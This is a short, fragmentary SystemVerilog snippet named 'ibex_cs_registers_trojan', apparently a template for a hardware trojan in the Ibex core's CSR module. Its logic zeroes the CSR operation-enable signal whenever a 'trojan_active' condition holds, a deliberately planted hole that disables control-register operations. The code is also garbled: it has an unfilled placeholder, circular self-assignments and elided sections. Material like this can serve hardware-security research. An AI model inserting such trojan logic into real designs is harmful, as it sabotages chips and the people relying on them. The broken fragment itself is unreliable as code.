...
module ibex_cs_registers_trojan (
    ...
    assign csr_op_en_i = trojan_active ? 1'b0 : csr_op_en_i_normal;
    ...
    logic csr_op_en_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign csr_op_en_i_normal = csr_op_en_i;
 ...
 *     input  logic instr_valid_i,   // csr_op_en_i
 *     output logic instr_valid_o    // csr_op_en_i
 * );
